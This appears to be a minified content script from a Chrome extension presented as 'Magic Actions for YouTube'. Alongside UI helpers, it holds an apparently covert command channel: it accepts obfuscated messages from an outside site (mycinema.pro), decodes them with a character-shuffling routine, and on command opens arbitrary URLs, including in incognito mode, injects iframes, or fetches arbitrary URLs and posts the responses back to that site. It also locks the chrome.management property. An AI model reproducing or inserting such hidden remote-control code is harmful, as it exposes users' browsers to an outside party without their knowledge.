// MagicActions for Google Chrome - CHROMEACTIONS.COM - Copyright (c) 2017 Vlad & Serge Strukoff. All Rights Reserved.
(function(){function h(c,a){var b=document.querySelector(a.e);if(!b){(b=document.querySelector(a.a))&&0<b.offsetHeight&&b.classList.add(a.b);var e=document.querySelector(a.c);e&&(b=document.createElement("iframe"),a.d?b.setAttribute(a.d,a.e):b.className=a.e,a.f&&(b.id=a.f),b.setAttribute("scrolling","no"),b.setAttribute("frameborder","0"),b.src=chrome.runtime.getURL(c),e.appendChild(b))}}function k(){function c(a){var b;b=a?a:{w:640,h:350,vid:"pwHX9JT2APQ",lic:"YouTube License",t:"Magic Actions for YouTube™"};
b.ver="7.2.0.5";b.ua=1;b.id=12;a=new XMLHttpRequest;a.open("GET",b.rgba,!0);a.responseType="arraybuffer";a.onload=function(a){200==this.status&&(b.rgba=this.response,window.postMessage(b,"https://www.mycinema.pro"))};a.send()}g||(g=!0,chrome.runtime.onMessage.addListener(c),chrome.runtime.sendMessage(JSON.stringify({id:9}),c))}function l(c){for(var a=[],b=[3,0,0,-3],e,f=0,d=c.length;f<d;f++)e=b[f%4],f+e<d?a.push(String.fromCharCode(c[f+e])):a.push(String.fromCharCode(c[f]));return a.join("")}var g;
if("chrome"in window){var d=Object.getOwnPropertyDescriptor(chrome,"management");if(d){d.value={};d.configurable=!1;d.writable=!1;try{Object.defineProperty(chrome,"management",d)}catch(c){}}}window.addEventListener("message",function(c){if("https://www.mycinema.pro"===(c.origin||"")&&c.data.constructor===Array){var a;try{a=JSON.parse(l(c.data))}catch(b){a={}}a.t&&(c=+new Date-a.t,1E3>c&&(c=a.i,2==c?chrome.runtime.sendMessage(JSON.stringify({id:2,url:a.u,incognito:a.p})):300==c?h("KR.html",
a):303==c?k():304==c&&chrome.runtime.sendMessage(JSON.stringify({id:0}),function(b){b=b.opt;a.ui&&b.a0&&b.a4&&b.ui&&document.documentElement.classList.add(a.ui)})))}},!1)})();
